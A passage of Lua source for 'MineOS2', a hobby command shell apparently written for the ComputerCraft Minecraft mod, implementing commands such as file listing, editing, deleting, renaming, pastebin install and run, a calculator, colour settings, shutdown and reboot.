            local fullPath = fs.combine(dir, file)
            local isStartupInRoot = (dir == ""/"" or dir == """") and file == ""startup.lua""
            local isHidden = file:match(""^%."")
            local isRom = file == ""rom""
            if not isRom and not isStartupInRoot and not isHidden then
                if fs.isDir(fullPath) then
                    print(""FO "" .. file)
                else
                    print(""FI "" .. file)
                end
            end
        end
        
    elseif command == ""hello"" then
        term.clear()
        term.setCursorPos(1,1)
        term.setTextColor(colors.orange)
        textutils.slowPrint(""Hello World!"")
        sleep(3)
        term.clear()
        term.setCursorPos(1,1)
        
    elseif command == ""pedit"" then
     local filename = args[2]
     if filename then
      local lower = string.lower(filename)
      if lower == ""startup"" or lower == ""startup.lua"" then
       print(""Warning you about to edit OS File"")
       sleep(2)
       local prevBG = term.getBackgroundColor()
       shell.run(""edit"", ""startup.lua"")
       term.setBackgroundColor(prevBG)
       term.clear()
       term.setCursorPos(1, 1)
      elseif fs.isDir(filename) then
       print(""Cannot edit folder"")
      else
         local ok, err = pcall(function()
         local prevBG = term.getBackgroundColor()
         shell.run(""edit"", filename)
         term.setBackgroundColor(prevBG)
         term.clear()
         term.setCursorPos(1, 1)
      end)
      if not term.isColor() then
      term.clear()
      term.setCursorPos(1,1)
      else
       if not ok then print(""Edit failed ""..tostring(err)) end
       if ok and fs.exists(""bsave.txt"") then
        local f = fs.open(""bsave.txt"", ""r"")
        local saved = f.readAll()
        f.close()
        if colors[saved] then
         term.setBackgroundColor(colors[saved])
         term.clear()
         term.setCursorPos(1, 1)
        end
       end
      end
     end
    end
       
    elseif command == ""popen"" then
        local progName = args[2]
        if progName then
            local lower = string.lower(progName)
            if lower == ""startup"" or lower == ""startup.lua"" then
                print(""Error opening that file"")
            elseif shell.resolveProgram(progName) then
                print(""Running "" .. progName)
                shell.run(progName)
            else
                print(""Unknown Program to open"")
            end
        end
    
    elseif command == ""mlist"" then
      local lines = {
        """",
        ""hello"",
        ""about"",
        ""shutoff"",
        ""popen <1>"",
        ""pedit <1>"",
        ""reboot"",
        ""cls"",
        ""shell"",
        ""cal <math>"",
        ""plist"",
        ""mlist"",
        ""pdelete <1>"",
        ""pir <ins/run>"",
        ""prename <1> <2>"",
        ""cd <1>"",
        ""mfolder <1>"",
        ""tcolor <color>"",
        ""cname <name>""
      }

      local w, h = term.getSize()
      local line = 0
      line = 2
      for i = 2, #lines do
        print(lines[i])
        line = line + 1
        if line >= h then
            print(""Press any key to continue..."")
            os.pullEvent(""key"")
            term.clear()
            term.setCursorPos(1,1)
            line = 2
        end
      end
        
    elseif command == ""shutoff"" then
        term.clear()
        term.setCursorPos(1,1)
        print(""Please Wait..."")
        sleep(1)
        term.setCursorPos(1,1)
        term.setTextColor(colors.red)
        print(""ShuttingOFF..."")
        sleep(4)
        running = false
        os.shutdown()
    
    elseif command == ""reboot"" then
        term.clear()
        term.setCursorPos(1,1)
        print(""Please Wait..."")
        sleep(1)
        term.clear()
        term.setCursorPos(1,1)
        term.setTextColor(colors.red)
        print(""Rebooting..."")
        sleep(4)
        running = false
        os.reboot()
    
    elseif command == ""cls"" then
        term.clear()
        term.setCursorPos(1,1)
    
    elseif command == ""shell"" then
        term.setTextColor(colors.yellow)
        print(""MineOS2"")
        
    elseif command == ""cal"" then
        local expression = input:sub(5) -- everything after 'cal '
        local fn, err = load(""return "" .. expression)
        if fn then
            local ok, result = pcall(fn)
            if ok then
                print(result)
            else
                print(""Error"")
            end
        end
        
    elseif command == ""pdelete"" then
      local filename = args[2]

      if filename then
        filename = filename
        local currentDir = shell.dir()
        local fullPath = fs.combine(currentDir, filename)
        local lower = string.lower(filename)
        if currentDir == """" and (lower == ""startup.lua"" or lower == ""startup"") then
            print(""Error deleting that file"")
        elseif fs.exists(fullPath) then
            fs.delete(fullPath)
            print(""Deleted "" .. filename)
        else
            print(""File not found "" .. filename)
        end
      end
        
    elseif command == ""pir"" then
      local sub = args[2]
      local code = args[3]

      if sub == ""run"" and code then
        shell.run(""pastebin"", ""run"", code)

      elseif sub == ""ins"" and code then
        local saveAs = ""pir_"" .. code
        shell.run(""pastebin"", ""get"", code, saveAs)
        print(""Installed as "" .. saveAs)
      end
        
    elseif command == ""prename"" then
      local oldName = args[2]
      local newName = args[3]

      if not oldName or not newName then
      else
        oldName = oldName .. "".lua""
        newName = newName .. "".lua""
        local currentDir = shell.dir()
        local fullOldPath = fs.combine(currentDir, oldName)
        local fullNewPath = fs.combine(currentDir, newName)
        if currentDir == """" and (oldName == ""startup.lua"" or newName == ""startup.lua"") then
            print(""Error renaming that file"")
        elseif not fs.exists(fullOldPath) then
            print(""Not exist"" .. oldName)
        elseif fs.exists(fullNewPath) then
            print(""Already exists "" .. newName)
        else
            fs.move(fullOldPath, fullNewPath)
            print(""Renamed "" .. newName)
        end
      end
        
    elseif command == ""cd"" then
        local target = args[2]
        if target and fs.exists(target) and fs.isDir(target) then
            shell.setDir(target)
            print(""Changed Dir "" .. shell.dir())
        else
            print(""Dir not found"")
        end
        
    elseif command == ""mfolder"" then
          local folderName = args[2]
          if folderName then
            local currentDir = shell.dir()
            local fullPath = fs.combine(currentDir, folderName)
            if fs.exists(fullPath) then
              print(""Folder exist"")
            else
              fs.makeDir(fullPath)
              print(""Created "" .. folderName)
            end
          end
        
   elseif command == ""tcolor"" then
    if not term.isColor() then
     print(""This computer cant work with colors"")
    else
     local colorname = args[2]
     if colorname == ""green"" then
     term.setBackgroundColor(colors.green)
     term.clear()
     term.setCursorPos(1,1)
     local f = fs.open(""bsave.txt"", ""w"")
     f.write(""green"")
     f.close()
     elseif colorname == ""blue"" then
     term.setBackgroundColor(colors.blue)
     term.clear()
     term.setCursorPos(1,1)
     local f = fs.open(""bsave.txt"", ""w"")
     f.write(""blue"")
     f.close()
     elseif colorname == ""black"" then
     term.setBackgroundColor(colors.black)
     term.clear()
     term.setCursorPos(1,1)
     local f = fs.open(""bsave.txt"", ""w"")
     f.write(""black"")
     f.close()
     elseif colorname == ""gray"" then
     term.setBackgroundColor(colors.gray)
     term.clear()
     term.setCursorPos(1,1)
     local f = fs.open(""bsave.txt"", ""w"")
     f.write(""gray"")
     f.close()
     elseif colorname == ""help"" then
      print(""Colors only that you can change"")
      print(""Blue/Gray/Black/Green"")
     else
     print(""Invalid color."")
     end
    end
        
   elseif command == ""cname"" then
    if args[2] then
      local file = fs.open(""nsave.txt"", ""w"")
      file.write(args[2])
      file.close()
      print(""Name saved: "" .. args[2])
    end

   else
        print(""Unknown MProgram to open"")
    end
end"
